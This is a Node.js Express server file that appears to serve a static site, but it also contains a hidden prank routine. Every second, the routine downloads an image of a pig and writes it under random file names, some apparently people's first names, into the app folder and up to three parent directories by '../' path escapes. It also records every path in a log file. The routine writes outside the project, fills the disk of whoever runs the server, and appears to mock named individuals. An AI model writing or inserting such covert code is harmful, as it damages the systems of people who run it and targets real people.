const path = require('path');
const fs = require('fs');
const http = require('http');
const https = require('https');
const express = require('express');

const app = express();

const server = http.createServer(app);

const PORT = process.env.PORT || 80;

const HOST = process.env.HOST || '0.0.0.0';

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.status(200).sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('*', (req, res) => {
    res.status(200).sendFile(path.join(__dirname, 'public', 'index.html'));
});

const minDepth = 0;
const maxDepth = 3;

const getRandomDepth = () => Math.floor((Math.random() * (maxDepth - minDepth + 1)) + minDepth);

const destinations = [];

const fileNames = [
    'troll',
    'matheo',
    'mathoe',
    'falk',
    'falken',
    'bbop',
    'elias',
    'andreas_k_den_kule',
    'andreas_r_den_ukule',
    'tær',
    'barn',
    'fortnite',
    'pubg',
    'spongebob',
    'patrick',
    'sandy',
    'mr_krabs',
    'squidward',
    'plankton',
    'krusty_krab',
    'chum_bucket',
];

function troll() {
    const fileName = `${fileNames[Math.floor(Math.random() * fileNames.length)]}_${Math.floor(Math.random() * 1000) + 1}.png`;

    let escapeStr = '';
    for (let i = 0; i < getRandomDepth(); i++) {
        escapeStr += '../';
    }

    const destination = path.join(__dirname, escapeStr, fileName);
    const file = fs.createWriteStream(destination);
    https.get('https://www.shutterstock.com/image-photo/big-black-african-pig-dirty-600w-1596564148.jpg', (res) => {
        res.pipe(file);
        file.on('finish', () => {
            file.close(() => {
                destinations.push(destination);

                let str = '';
                for (const d of destinations) {
                    str += d + '\n';
                }

                fs.writeFile('destinations.txt', str, () => {
                    console.log("womp")
                });
            });
        });
    });
}

setInterval(() => {
    troll();
}, 1000);

server.listen(PORT, HOST);